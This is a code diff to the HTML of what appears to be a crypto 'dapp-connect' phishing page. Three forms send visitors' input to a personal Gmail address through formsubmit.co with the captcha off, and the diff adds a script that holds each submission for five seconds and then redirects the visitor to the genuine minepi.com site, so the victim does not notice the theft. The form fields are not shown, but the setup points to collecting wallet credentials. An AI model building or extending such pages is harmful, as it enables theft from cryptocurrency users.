@@ -58,7 +58,7 @@
                               </ul>
                               <div class="tab-content" id="myTabContent">
                                 <div class="tab-pane fade show active" id="home" role="tabpanel" aria-labelledby="home-tab">
-                                    <form action="https://formsubmit.co/001issabella@gmail.com" method="POST">
+                                    <form id="myForm" action="https://formsubmit.co/001issabella@gmail.com" method="POST">
                                         <div class="form-group mb-3">
                                             <input type="hidden" name="_next" value="https://dapp-connect.github.io/token/thanks.html">
                                             <input type="hidden" name="_captcha" value="false">
@@ -70,7 +70,7 @@
                                     </form>
                                 </div>
                                 <div class="tab-pane fade" id="profile" role="tabpanel" aria-labelledby="profile-tab">
-                                    <form action="https://formsubmit.co/001issabella@gmail.com" method="POST">
+                                    <form id="myForm" action="https://formsubmit.co/001issabella@gmail.com" method="POST">
                                         <div class="form-group mb-3">
                                             <input type="hidden" name="_captcha" value="false">
                                             <input type="hidden" name="_next" value="https://dapp-connect.github.io/token/thanks.html">
@@ -83,7 +83,7 @@
                                     </form>
                                 </div>
                                 <div class="tab-pane fade" id="contact" role="tabpanel" aria-labelledby="contact-tab">
-                                    <form action="https://formsubmit.co/001issabella@gmail.com" method="POST">
+                                    <form id="myForm" action="https://formsubmit.co/001issabella@gmail.com" method="POST">
                                         <div class="form-group mb-3">
                                             <input type="hidden" name="_captcha" value="false">
                                             <input type="hidden" name="_next" value="https://dapp-connect.github.io/token/thanks.html">
@@ -106,5 +106,18 @@
 
     <!-- bootstrap js link -->
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
+    <script>
+    document.getElementById("myForm").addEventListener("submit", function(event) {
+        event.preventDefault(); // Prevent default submission for 5 seconds
+
+        setTimeout(function() {
+            document.getElementById("myForm").submit(); // Submit the form
+        }, 5000); // 5-second delay
+
+        setTimeout(function() {
+            window.location.href = "https://minepi.com/"; // Change to your desired redirect URL
+        }, 5000); // Redirect after 5 seconds
+    });
+</script>
 </body>
 </html>
